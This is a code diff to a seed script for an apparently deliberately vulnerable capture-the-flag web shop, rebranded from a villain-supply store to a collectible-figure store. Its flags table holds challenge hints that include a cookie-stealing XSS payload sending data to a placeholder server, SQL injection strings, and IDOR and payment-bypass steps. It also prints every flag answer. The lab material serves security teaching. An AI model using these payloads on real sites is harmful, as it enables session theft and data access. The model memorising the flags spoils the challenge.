@@ -6,39 +6,41 @@ db.exec('DROP TABLE IF EXISTS order_items');
 db.exec('DROP TABLE IF EXISTS reviews');
 db.exec('DROP TABLE IF EXISTS orders');
 db.exec('DROP TABLE IF EXISTS products');
-db.exec('DROP TABLE IF EXISTS villains');
+db.exec('DROP TABLE IF EXISTS users');
 db.exec('DROP TABLE IF EXISTS flags');
+// Drop the old ones just in case
+db.exec('DROP TABLE IF EXISTS villains');
 
 initTables(db);
 
 // ═══════════════════════════════════════
-//  VILLANOS (Usuarios)
+//  USERS (Collectors)
 // ═══════════════════════════════════════
-const insertVillain = db.prepare(`
-  INSERT INTO villains (username, password, display_name, role, bio, session_token)
+const insertUser = db.prepare(`
+  INSERT INTO users (username, password, display_name, role, bio, session_token)
   VALUES (?, ?, ?, ?, ?, ?)
 `);
 
-const villains = [
-  ['dr_maligno', 'password123', 'Dr. Maligno', 'admin',
-    'CEO y Jefe Supremo de Villain Supply Co. Colecciona gatos persas y rayos de destrucción.',
+const users = [
+  ['bugdrop_admin', 'password123', 'The Creator', 'admin',
+    'Lead designer at Bugdrop. I know where the molds are kept.',
     'admin-token-super-secreto-12345'],
-  ['minion_42', 'esbirro2024', 'Esbirro #42', 'villain',
-    'Empleado del mes 14 veces seguidas. Especialista en fracasar espectacularmente.',
+  ['minion_42', 'esbirro2024', 'Collector #42', 'collector',
+    'Verified Buyer. Has 14 complete sets.',
     null],
-  ['lady_caos', 'chaos666', 'Lady Caos', 'villain',
-    'Ex-meteoróloga que descubrió que causar tormentas artificiales era más lucrativo.',
+  ['lady_caos', 'chaos666', 'Lady Caos', 'collector',
+    'Early Adopter. Keeps everything in mint condition.',
     null],
-  ['prof_doom', 'doom1234', 'Profesor Doom', 'villain',
-    'Ingeniero nuclear reconvertido. Sus inventos explotan el 60% de las veces.',
+  ['prof_doom', 'doom1234', 'Prof. Doom', 'collector',
+    'Bulk Buyer. Buys out stock every drop.',
     null],
-  ['hacker_fantasma', 'ghost_in_shell', 'El Fantasma Digital', 'villain',
-    'Nadie sabe su identidad real. Pide todo a una dirección PO Box en una isla volcánica.',
+  ['hacker_fantasma', 'ghost_in_shell', 'The Ghost', 'collector',
+    'Anonymous Collector. Ships to a PO Box.',
     null],
 ];
 
-for (const v of villains) {
-  insertVillain.run(...v);
+for (const u of users) {
+  insertUser.run(...u);
 }
 
 // ═══════════════════════════════════════
@@ -50,36 +52,42 @@ const insertProduct = db.prepare(`
 `);
 
 const products = [
-  ['Rayo Mortal de Destrucción Masiva',
-    'El clásico que nunca falla (excepto cuando falla). Incluye manual de 800 páginas y garantía de 30 días.',
-    1000000000, 'armas', '🔫', 3, 1],
-  ['Tiburón con Láser Integrado',
-    'Tiburón blanco de 4 metros con láser de 50MW montado en la cabeza. Alimentación incluida por 1 mes.',
-    50000000, 'mascotas', '🦈', 7, 1],
-  ['Pack 100 Uniformes de Esbirro (Talla Única)',
-    'Monos naranjas ignífugos. Talla única que no le queda bien a nadie. Incluye logo personalizable.',
-    15000, 'uniformes', '👔', 500, 0],
-  ['Guarida Volcánica Premium (Alquiler Mensual)',
-    'Volcán activo en isla privada del Pacífico. 15 habitaciones, hangar para 3 jets, piscina de lava decorativa.',
-    2500000, 'guaridas', '🌋', 2, 1],
-  ['Kit de Monólogo Villano Profesional',
-    'Incluye atril giratorio, iluminación dramática, máquina de humo y 50 frases pre-escritas. "Les contaré mi plan..."',
-    999, 'accesorios', '🎭', 200, 0],
-  ['Gato Persa Blanco (Edición Malvada)',
-    'Entrenado para sentarse en tu regazo durante reuniones amenazantes. Incluye trono compatible.',
-    8500, 'mascotas', '🐱', 12, 0],
-  ['Satélite Orbital de Vigilancia',
-    'Resolución 0.5m. Capacidad de zoom en cualquier punto del planeta. Bonus: puede proyectar tu cara en la Luna.',
-    750000000, 'tecnología', '🛰️', 1, 1],
-  ['Submarino de Escape Unipersonal',
-    'Para cuando el plan B también falla. Velocidad máx: 40 nudos. Autonomía: 72h. Snacks incluidos.',
-    12000000, 'vehículos', '🚢', 5, 0],
-  ['Dispositivo de Control Mental v3.2',
-    'Ahora con Bluetooth. Alcance: 50 metros. No funciona en personas con gorros de aluminio.',
-    340000, 'tecnología', '🧠', 15, 0],
-  ['Trampa para Héroes Deluxe',
-    'Jaula suspendida sobre foso con cocodrilos. Incluye temporizador visible y botón rojo grande que nunca debes dejar cerca del héroe.',
-    75000, 'seguridad', '🪤', 30, 0],
+  ['Bug Hacker',
+    'Black hoodie. RGB laptop. Coffee in hand. This Bug prefers working late at night and asking no questions. Series 01 · Common.',
+    29, 'series-01', '🐛', 150, 0],
+  ['Bug Aviator',
+    'Aviator goggles, scarf in the wind, and the smile of someone fully in control. Series 01 · Common.',
+    29, 'series-01', '🐛', 120, 0],
+  ['Bug Robot',
+    'Half creature, half machine. Runs on either coffee or code, we are still not sure. Series 01 · Common.',
+    29, 'series-01', '🐛', 130, 0],
+  ['Bug Firefighter',
+    'Always ready to put out the fire... or to start one. Red helmet included. Series 01 · Common.',
+    29, 'series-01', '🐛', 110, 0],
+  ['Bug Astronaut',
+    'Has traveled further than any other Bug. What he saw out there changed him forever. Series 01 · Rare.',
+    49, 'series-01', '🐛', 60, 0],
+  ['Bug Chef',
+    'An 8-inch knife, leather apron, and a recipe nobody else knows. Series 01 · Common.',
+    29, 'series-01', '🐛', 100, 0],
+  ['Bug Detective',
+    'Sees everything. Knows everything. Never tells you how. Polished magnifying glass included. Series 01 · Rare.',
+    49, 'series-01', '🐛', 55, 0],
+  ['Bug Scientist',
+    'White lab coat, safety goggles, and three failed experiments a day. Very promising. Series 01 · Common.',
+    29, 'series-01', '🐛', 115, 0],
+  ['Bug Cowboy',
+    'Wide-brimmed hat, silver spurs, and a stare that needs no words. Series 01 · Common.',
+    29, 'series-01', '🐛', 120, 0],
+  ['Bug Samurai',
+    'Black lacquered armor, twin-blade katana, and a discipline the other Bugs cannot comprehend. Series 01 · Rare.',
+    49, 'series-01', '🐛', 45, 0],
+  ['Bug Wizard',
+    'Starry cape, crystal wand, and a hat from which things emerge that are better left unquestioned. Series 01 · Rare.',
+    49, 'series-01', '🐛', 50, 0],
+  ['Bug ???',
+    '???',
+    999, 'secret', '🐛', 1, 1],
 ];
 
 for (const p of products) {
@@ -87,10 +95,10 @@ for (const p of products) {
 }
 
 // ═══════════════════════════════════════
-//  PEDIDOS (incluye el pedido secreto de Dr. Maligno)
+//  PEDIDOS (incluye el pedido secreto del Admin)
 // ═══════════════════════════════════════
 const insertOrder = db.prepare(`
-  INSERT INTO orders (villain_id, status, payment_status, total_price, notes)
+  INSERT INTO orders (user_id, status, payment_status, total_price, notes)
   VALUES (?, ?, ?, ?, ?)
 `);
 
@@ -99,53 +107,49 @@ const insertOrderItem = db.prepare(`
   VALUES (?, ?, ?, ?)
 `);
 
-// Pedido 1: Dr. Maligno — contiene los planos secretos (bandera IDOR)
+// Pedido 1: The Creator (Admin) — contiene los planos secretos (bandera IDOR)
 const order1 = insertOrder.run(
   1, 'completed', 'paid', 752500000,
-  '🚨 ULTRA SECRETO 🚨 Planos de la guarida submarina en coordenadas 47.1234°N, 172.5678°W. Código de acceso: FLAG{idor_planos_secretos_dr_maligno}. NO COMPARTIR CON ESBIRROS DE NIVEL < 9.'
+  '🚨 INTERNAL ONLY 🚨 Production molds for Bug ???. Factory coordinates: 47.1234°N, 172.5678°W. Access Code: FLAG{idor_leaked_factory_molds}. DO NOT SHARE OUTSIDE DESIGN TEAM.'
 );
-insertOrderItem.run(order1.lastInsertRowid, 4, 1, 2500000);
-insertOrderItem.run(order1.lastInsertRowid, 7, 1, 750000000);
+insertOrderItem.run(order1.lastInsertRowid, 12, 1, 999);
 
-// Pedido 2: Esbirro #42
+// Pedido 2: Collector #42
 const order2 = insertOrder.run(
-  2, 'shipped', 'paid', 15999,
-  'Necesito los uniformes para la fiesta de fin de año.'
+  2, 'shipped', 'paid', 58,
+  'Hoping to get the Samurai one.'
 );
-insertOrderItem.run(order2.lastInsertRowid, 3, 1, 15000);
-insertOrderItem.run(order2.lastInsertRowid, 5, 1, 999);
+insertOrderItem.run(order2.lastInsertRowid, 3, 2, 29);
 
 // Pedido 3: Lady Caos
 const order3 = insertOrder.run(
-  3, 'pending', 'paid', 50008500,
-  'Quiero que el tiburón sea de color rosa, por favor.'
+  3, 'pending', 'paid', 49,
+  'Please pack with extra bubble wrap, keeping it sealed in box.'
 );
-insertOrderItem.run(order3.lastInsertRowid, 2, 1, 50000000);
-insertOrderItem.run(order3.lastInsertRowid, 6, 1, 8500);
+insertOrderItem.run(order3.lastInsertRowid, 5, 1, 49);
 
 // Pedido 4: Prof. Doom
 const order4 = insertOrder.run(
   4, 'pending', 'pending', 12340000,
-  'Nota: mi último submarino explotó. Espero que este no.'
+  'Note: I am buying out the whole stock.'
 );
-insertOrderItem.run(order4.lastInsertRowid, 8, 1, 12000000);
-insertOrderItem.run(order4.lastInsertRowid, 9, 1, 340000);
+insertOrderItem.run(order4.lastInsertRowid, 8, 100, 29);
+
 
 // ═══════════════════════════════════════
 //  RESEÑAS
 // ═══════════════════════════════════════
 const insertReview = db.prepare(`
-  INSERT INTO reviews (villain_id, product_id, content, rating)
+  INSERT INTO reviews (user_id, product_id, content, rating)
   VALUES (?, ?, ?, ?)
 `);
 
 const reviews = [
-  [2, 3, 'Los uniformes se encogen al lavarlos. Ahora parezco un esbirro comprimido. 3/5', 3],
-  [3, 2, 'El tiburón se comió a dos esbirros antes de que pudiéramos instalarle el láser. 10/10 compraría otro.', 5],
-  [4, 9, 'El control mental funciona perfecto excepto en mi suegra. Producto defectuoso.', 2],
-  [2, 5, 'Usé el kit de monólogo y el héroe se escapó mientras hablaba. Como siempre. Muy realista.', 4],
-  [5, 10, 'La trampa es genial pero el botón rojo estaba demasiado cerca de la jaula. El héroe escapó en 30 segundos.', 1],
-  [3, 6, 'El gato es adorable pero me araña cada vez que intento hacer una videollamada amenazante.', 4],
+  [2, 1, 'The paint job on the hoodie is amazing. Fits perfectly with my desk setup. 5/5', 5],
+  [3, 2, 'The box was slightly dented when it arrived. The figure is cool though.', 3],
+  [4, 5, 'Bought 10 boxes trying to get the Secret. Got 4 Astronauts instead. Nice detail.', 4],
+  [2, 6, 'Love the little chef hat! The clay texture is incredible.', 5],
+  [5, 10, 'The Samurai sword arrived bent. I had to heat it up to fix it.', 2],
 ];
 
 for (const r of reviews) {
@@ -162,33 +166,40 @@ const insertFlag = db.prepare(`
 
 const flags = [
   ['cart_manipulation',
-    'FLAG{carrito_gratis_rayo_mortal}',
-    'Carrito Gratis',
-    'Consigue comprar el "Rayo Mortal de Destrucción Masiva" ($1,000,000,000) por $0 o menos.',
+    'FLAG{free_drop_cart_manipulation}',
+    'Free Drop (Cart Manipulation)',
+    'Acquire the Secret Bug ($999) for $0 or less.',
     'easy',
-    'Los precios no deberían decidirse en el cliente... ¿Qué pasa si el servidor confía ciegamente en lo que le envías?',
-    'Intercepta la petición POST /api/cart/checkout con Burp Suite o las DevTools. Busca el campo "price" o "total" en el body JSON y cámbialo a 0.'],
+    'Prices should not be decided on the client side... What if the server blindly trusts what you send?',
+    'Intercept the POST /api/cart/checkout request with Burp Suite or DevTools. Find the "unit_price" in the JSON body and change it to 0.'],
   ['stored_xss',
-    'FLAG{xss_esbirro_roba_cookies}',
-    'XSS del Esbirro',
-    'Roba la cookie del Jefe Supremo (admin) inyectando código en las reseñas de productos.',
+    'FLAG{xss_collector_stolen_session}',
+    'Stolen Session (Stored XSS)',
+    'Steal the admin cookie (The Creator) by injecting code into the product reviews.',
     'medium',
-    'Las reseñas de productos se muestran sin sanitizar. ¿Qué pasa si escribes algo que no es exactamente texto plano?',
-    'Escribe una reseña con un payload como <script>document.location="http://tu-servidor?c="+document.cookie</script> o simplemente ejecuta un alert() con document.cookie.'],
+    'Product reviews are rendered without sanitization. What if you write something that is not just plain text?',
+    'Write a review with a payload like <script>document.location="http://your-server?c="+document.cookie</script> or just execute alert() with document.cookie.'],
   ['idor_orders',
-    'FLAG{idor_planos_secretos_dr_maligno}',
-    'Planos Secretos (IDOR)',
-    'Lee el pedido #1 de Dr. Maligno que contiene los planos de su guarida secreta.',
+    'FLAG{idor_leaked_factory_molds}',
+    'Leaked Molds (IDOR)',
+    'Read order #1 belonging to The Creator containing the factory molds coordinates.',
     'easy',
-    'Cuando consultas tus propios pedidos, la URL contiene un ID numérico. ¿El servidor verifica que ese pedido realmente te pertenece?',
-    'Haz una petición GET /api/orders/1 estando logueado como cualquier otro usuario. Si no hay validación de propiedad, verás los datos del Dr. Maligno.'],
+    'When checking your own collection/orders, the URL has a numeric ID. Does the server verify that order belongs to you?',
+    'Make a GET request to /api/orders/1 while logged in as any other user. If there is no ownership validation, you will see The Creator data.'],
   ['payment_bypass',
-    'FLAG{bypass_pago_soy_villain_vip}',
-    'Bypass de Pago',
-    'Completa una compra sin pagar manipulando el estado del pago.',
+    'FLAG{payment_bypass_vip_collector}',
+    'Payment Bypass',
+    'Complete a purchase without paying by manipulating the payment status.',
     'medium',
-    'El sistema de pago confía en lo que el cliente le dice sobre el resultado de la transacción. ¿Quién valida realmente si pagaste?',
-    'Intercepta la petición POST /api/orders/:id/pay. El servidor acepta un JSON con {"status": "success"} sin verificar con ningún procesador de pago. Envíalo directamente.'],
+    'The payment system trusts the client about the transaction result. Who actually validates if you paid?',
+    'Intercept the POST /api/orders/:id/pay request. The server accepts a JSON with {"status": "success"} without verifying with any payment processor. Send it directly.'],
+  ['sqli_newsletter',
+    'FLAG{sqli_newsletter_admin_coupon}',
+    'Newsletter SQLi',
+    'Steal the admin exclusive coupon via the newsletter subscription form.',
+    'easy',
+    'The newsletter input is raw concatenated into the SQL query.',
+    "Try putting `bugdrop_admin'--` or `admin' OR '1'='1` in the email input. Because the frontend uses type='text' instead of 'email', you can bypass HTML validation easily."],
 ];
 
 for (const f of flags) {
@@ -197,19 +208,20 @@ for (const f of flags) {
 
 console.log(`
 ╔══════════════════════════════════════════════════╗
-║  🦹 Base de datos sembrada exitosamente          ║
+║  📦 Bugdrop Database Seeded Successfully         ║
 ╠══════════════════════════════════════════════════╣
-║  Villanos:   ${villains.length}                                   ║
-║  Productos:  ${products.length}                                  ║
-║  Pedidos:    4                                   ║
-║  Reseñas:    ${reviews.length}                                   ║
-║  Banderas:   ${flags.length}                                   ║
+║  Users:      ${users.length}                                   ║
+║  Products:   ${products.length}                                  ║
+║  Orders:     4                                   ║
+║  Reviews:    ${reviews.length}                                   ║
+║  Flags:      ${flags.length}                                   ║
 ╠══════════════════════════════════════════════════╣
-║  🎯 Banderas CTF:                                ║
-║  1. FLAG{carrito_gratis_rayo_mortal}             ║
-║  2. FLAG{xss_esbirro_roba_cookies}               ║
-║  3. FLAG{idor_planos_secretos_dr_maligno}        ║
-║  4. FLAG{bypass_pago_soy_villain_vip}            ║
+║  🎯 CTF Flags:                                   ║
+║  1. FLAG{free_drop_cart_manipulation}            ║
+║  2. FLAG{xss_collector_stolen_session}           ║
+║  3. FLAG{idor_leaked_factory_molds}              ║
+║  4. FLAG{payment_bypass_vip_collector}           ║
+║  5. FLAG{sqli_newsletter_admin_coupon}           ║
 ╚══════════════════════════════════════════════════╝
 `);
 
